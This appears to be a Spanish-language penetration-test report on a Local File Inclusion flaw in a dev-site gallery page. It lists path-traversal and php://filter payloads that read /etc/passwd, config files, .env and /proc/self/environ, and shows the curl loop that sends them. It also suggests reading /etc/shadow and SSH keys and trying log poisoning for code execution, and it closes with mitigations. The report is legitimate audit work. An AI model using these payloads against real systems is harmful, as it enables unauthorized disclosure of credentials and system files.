# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T08:27:08
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Fue posible leer ficheros del sistema (p. ej. /etc/passwd) mediante traversal y también obtener contenido codificado usando el wrapper php://filter. Impacto: posible divulgación de información sensible y vectores para escalada (lectura de ficheros de configuración, keys, o RCE por log poisoning).

Detalles del hallazgo
---------------------
- URL vulnerable: http://web.dev.local:8081/gallery.php?page=
- Parámetro vulnerable: page (uso local file inclusion para incluir archivos en servidor)

Comandos y metodología utilizados
---------------------------------
1) Reconocimiento inicial (curl):
   - curl -sS http://web.dev.local:8081/ -L -o target_root.html
   - Se observó enlaces como: gallery.php?page=modern|classic|abstract|about

2) Fuzzing / pruebas manuales (lista de payloads probados con curl):
   - Se empleó un script de pruebas que iteró payloads diversos y guardó respuestas en lfi_results.txt.
   - Payloads probados (no exhaustivo):
     "../../../../../../etc/passwd"
     "../../../../../etc/passwd"
     "../../../etc/passwd"
     "../../etc/passwd"
     "../etc/passwd"
     "/etc/passwd"
     "php://filter/read=convert.base64-encode/resource=/etc/passwd"
     "php://filter/read=convert.base64-encode/resource=gallery.php"
     "php://filter/read=convert.base64-encode/resource=../config.php"
     "config.php"
     "../.env"
     ".git/config"
     "../../../../../../proc/self/environ"

3) Comando de ejemplo usado para cada payload:
   - curl -s -D - "http://web.dev.local:8081/gallery.php?page=<PAYLOAD>" -o /tmp/lfi_body.tmp

Evidencia de lectura de ficheros
--------------------------------
- Lectura directa de /etc/passwd (fragmento):

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Resultado con php://filter (base64): el payload
  php://filter/read=convert.base64-encode/resource=/etc/passwd
  devolvió contenido codificado en Base64 que fue decodificado con éxito y contenía las mismas entradas del /etc/passwd.

Confirmación y alcance
----------------------
- VULN_FOUND: true — Se confirmó LFI al poder leer ficheros de la aplicación y del sistema.
- VULN_EXPLOITED: true — Se leyó con éxito un fichero crítico del sistema (/etc/passwd).

Intentos adicionales de explotación
----------------------------------
- Se intentó acceder a /proc/self/environ para buscar variables de entorno con posibles credenciales o vectores de RCE (intentado: ../../../../../../proc/self/environ y proc/self/environ) — no se obtuvo contenido útil en esta iteración, pero el acceso a /etc/passwd ya muestra capacidad de acceso al sistema de archivos.
- Recomendación para siguientes pasos de red team (opcional y bajo autorización):
  - Intentar lectura de /etc/shadow (si es accesible) o claves privadas (~/.*ssh/id_rsa) usando wrappers y traversal.
  - Intentar log poisoning para escalar a RCE si la aplicación registra entradas que luego son incluidas.

Impacto
-------
- Divulgación de información del sistema: usuarios del sistema, rutas, y potencialmente ficheros de configuración.
- Con acceso a ficheros de configuración (p. ej. config.php, .env) se podrían obtener credenciales de bases de datos y claves.
- Vectores de escalada: lectura de /proc/self/environ, extracción de claves SSH, o RCE mediante log poisoning.

Mitigaciones recomendadas
-------------------------
1) Validación y saneamiento estricto del parámetro `page`:
   - Implementar lista blanca (whitelist) de páginas permitidas (ej. modern, classic, abstract, about) y rechazar cualquier entrada no listada.
2) Evitar incluir directamente archivos basándose en parámetros de usuario.
3) Si se requiere inclusión dinámica, mapear nombres lógicos a rutas fijas en servidor (no usar la entrada del usuario como parte de la ruta).
4) Deshabilitar wrappers peligrosos (en la medida de lo posible) y deshabilitar allow_url_include en php.ini.
5) Restricción de permisos del sistema de archivos: el usuario del servidor web debe tener acceso mínimo.
6) Monitorización y alerta en logs para detectar inclusión o lecturas inusuales.

Ficheros generados durante la auditoría
-------------------------------------
- /app/reports/target_root.html (copia de la página principal)
- /app/reports/lfi_results.txt (salida completa de pruebas LFI)
- /app/reports/lfi_extracted/ (intentos de decodificación base64)

Conclusión
----------
El objetivo presenta una vulnerabilidad LFI explotable que permitió la lectura de /etc/passwd. El hallazgo es crítico en términos de confidencialidad y puede facilitar ataques posteriores de escalada. Se recomienda mitigar inmediatamente y realizar una revisión de seguridad más profunda.

Anexo: comandos exactos ejecutados (resumen)
-------------------------------------------
- curl -sS http://web.dev.local:8081/ -L -o target_root.html
- for p in <PAYLOADS>; do curl -s -D - "http://web.dev.local:8081/gallery.php?page=$p" -o /tmp/lfi_body.tmp; done
- php://filter/read=convert.base64-encode/resource=/etc/passwd -> base64 decode


-- Fin del informe
